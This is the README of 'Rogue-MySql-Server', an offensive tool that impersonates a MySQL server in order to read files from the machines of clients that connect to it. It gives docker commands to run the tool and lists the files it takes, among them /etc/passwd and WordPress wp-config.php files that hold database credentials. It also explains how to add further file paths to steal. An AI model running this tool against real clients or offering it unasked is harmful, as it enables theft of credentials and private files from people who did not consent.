Rogue-MySql-Server
==================

Edit script and change file to read and server port if you want. Run script and connect to your server for read file from client side. 
Read mysql.log for readed file content.

```
docker build -t Rogue-MySql-Server:latest .
docker run -it -p 3306:3306 -v $(pwd):/log/ Rogue-MySql-Server:latest
```

You can cat mysql.log to see what has been captured.

Currently attempts to grab the following:

```
filelist = (
    '/etc/passwd',
    '/etc/hosts',
    '/var/www/html/index.php',
    '/var/www/html/wp-config.php',
    '/var/www/index.php',
    '/var/www/wp-config.php'
)
```

Just add more paths for files you want and every time you query the mysql server it will attempt to grab a new file.
